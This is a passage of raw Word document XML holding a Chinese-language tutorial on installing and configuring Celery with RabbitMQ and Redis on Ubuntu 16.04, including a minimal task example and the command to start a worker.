          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>等，这里我先不去看它是如何存储的，就先选用</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来存储任务执行结果。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE0B83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然后我接着去安装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，在安装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之前，我已经在自己虚拟机上安装好了</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，版本是</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>3.6</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A07C4AA" w14:textId="77777777" w:rsidR="00E00B91"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，版本为</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>4.2.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0710677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sudo apt install python-celery-common</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5DA1BD"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因为涉及到消息中间件，所以我先去选择一个在我工作中要用到的消息中间件（在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帮助文档中称呼为中间人</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;broker&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>），为了更好的去理解文档中的例子，我安装了两个中间件，一个是</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一个</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721285E8"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在这里我就先根据</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的帮助文档安装和设置</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。要使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Celery</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，我们需要创建一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> RabbitMQ </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用户、一个虚拟主机，并且允许这个用户访问这个虚拟主机。下面是我在个人</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pc</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>机</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Ubuntu16.04</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>上的设置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA8029A" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="008D0AE9" w:rsidRDefault="00E00B91" w:rsidP="00A75DA0">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:before="150" w:after="150" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>$ sudo rabbitmqctl add_user forward password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0778A86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创建了一个</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用户</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用户名为</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>forward</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，密码是</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE09AA8"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sudo rabbitmqctl add_vhost ubuntu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5599FDD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创建了一个虚拟主机，主机名为</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ubuntu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FAB0C2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sudo rabbitmqctl set_permissions -p ubuntu forward ".*" ".*" ".*"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFDE3C0"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lastRenderedPageBreak/>
        <w:t>#</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>允许用户</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>forward</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>访问虚拟主机</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ubuntu</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，因为</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通过主机名来与节点通信</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A16FD5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sudo rabbitmq-server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F01BC1D"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之后我启用</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服务器，结果如下，成功运行：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209A5F48"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8D0AE9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20D31E04" wp14:editId="5E334F7A">
            <wp:extent cx="5288738" cy="1371719"/>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88738" cy="1371719"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D46103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之后我安装</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它的安装比较简单</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如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E8FD9F"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sudo pip install redis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C56AF5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然后进行简单的配置，只需要设置</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Redis </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>数据库的位置</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2490F8F1"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BROKER_URL = 'redis://localhost:6379/0'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AAFDB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URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的格式为：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D3DF8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redis://:password**@hostname**:port/db_number</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1532D83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URL Scheme </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>后的所有字段都是可选的，并且默认为</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> localhost </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 xml:space="preserve"> 6379 </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端口，使用数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。我的配置是：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9CB8B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redis://:password**@ubuntu**:6379/5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4966A74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之后安装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，我是用标准的</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工具</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pip</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>安装的，如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022B6EF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sudo pip install celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574CA0F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的命令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C9110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Global Options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099E5751"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 APP, --app APP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A886CE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-b BROKER, --broker BROKER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC5E54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--result-backend RESULT_BACKEND</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F8CF9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--loader LOADER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3FEFAD"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--config CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BDA9F4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--workdir WORKDIR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1E5CE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--no-color, -C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DF2DDD"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--quiet, -q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEF3B3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00C0B01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 - - ---- Commands- -------------- --- ------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2F171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89515C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Main: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A70A16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lastRenderedPageBreak/>
        <w:t xml:space="preserve">|    celery worker     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEC8B6F"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celery events</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76AE292B"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celery beat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126E3C9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celery shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A179BA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celery multi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460388A5" w14:textId="27A731AF"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celery amqp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109DF30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开始使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1680A87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使用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包含三个方面：</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>定义任务函数。</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>运行</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服务。</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>客户应用程序的调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CB7FB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注意：发送者和消费者职能处理启动前就定义好的任务，不能代码中现场定义。也就是说必须在定义任务后才能启动消费者。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EEBEC8"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定义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5719E6C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为了测试</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能否工作，我运行了一个最简单的任务，编写</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B8594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celery import Celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16450C7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broker</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置中间件，</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>backend</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置后端存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FB589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app = Celery('app_name',broker='redis://127.0.0.1:6379/5',backend='redis://127.0.0.1:6379/6')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5282774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@app.task(name='task_name')       # </w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>被标记的都属于这个</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="00A75DA0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7226407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def add(x,y):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40833FF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return x+y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0639A59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编辑保存退出后，我在当前目录下运行如下命令</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记得要先开启</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C92A14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p>
    <w:p w14:paraId="5041A0DE"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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>启动一个</w:t>
      </w:r>
      <w:r w:rsidRPr="008D0AE9">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>worker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C54589"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celery  worker -A app1 --loglevel=info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0946ED"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其中</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会根据</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后面的参数作为命令启动目录的相对目录，去找个这个相对目录文件中的</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变量，并把所有用</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>@app.task</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>修饰的函数作为任务来记录元数据。所以不同目录的启动命令是不一样的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF2C7B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查询文档，了解到该命令中</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>-A</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数表示的是</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Celery APP</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的名称，这个实例中指的就是</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>（和文件名一致），后面的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app1</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>就是</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的名称，</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是一个执行任务角色，后面的</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>loglevel=info</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>记录日志类型默认是</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>info,</w:t>
      </w:r>
      <w:r w:rsidRPr="00B227A8">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="666666"/>
          <w:kern w:val="0"/>
